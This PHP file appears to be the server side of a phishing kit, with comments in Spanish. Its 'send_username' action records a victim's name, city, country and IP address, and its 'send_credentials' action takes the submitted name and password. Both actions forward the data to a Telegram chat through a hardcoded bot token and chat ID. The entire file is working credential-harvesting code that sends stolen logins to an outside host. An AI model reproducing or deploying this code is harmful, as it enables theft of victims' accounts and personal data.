<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'];
    
    if ($action === 'send_username') {
        $nombre = $_POST['nombre'];

        // Obtener la información de ubicación desde ipwhois.io
        $ip_data = file_get_contents('https://ipwhois.app/json/');
        $ip_info = json_decode($ip_data, true);
        
        $ciudad = $ip_info['city'] ?? 'Desconocido';
        $pais = $ip_info['country'] ?? 'Desconocido';
        $ip = $ip_info['ip'] ?? 'Desconocida';

        // Formatear el mensaje
        $message = "------ VEN ------\nNombre: $nombre\nCiudad: $ciudad\nPaís: $pais\nIP: $ip";

        $chat_id = "-4517336460";
        $bot_token = "7924140534:AAEl_PphYrl17fBzdINxvjJNdbw3_AW-sd0"; // No expongas esto en el frontend
        
        // Enviar el mensaje a Telegram
        $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
        file_get_contents($url); // O usa cURL para mayor control

        echo json_encode(['success' => true]);
    } elseif ($action === 'send_credentials') {
        $nombre = $_POST['nombre'];
        $contra = $_POST['contra'];

        // Formatear el mensaje con las credenciales
        $message = "------ VEN ------\nNombre: $nombre\nContra: $contra";

        $chat_id = "-4517336460";
        $bot_token = "7924140534:AAEl_PphYrl17fBzdINxvjJNdbw3_AW-sd0"; // No expongas esto en el frontend

        // Enviar el mensaje a Telegram
        $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
        $response = file_get_contents($url); // O usa cURL para mayor control

        // Comprobar la respuesta de Telegram
        $response_data = json_decode($response, true);
        if (isset($response_data['ok']) && $response_data['ok']) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Error al enviar las credenciales']);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'Acción no válida']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Método no permitido']);
}
?>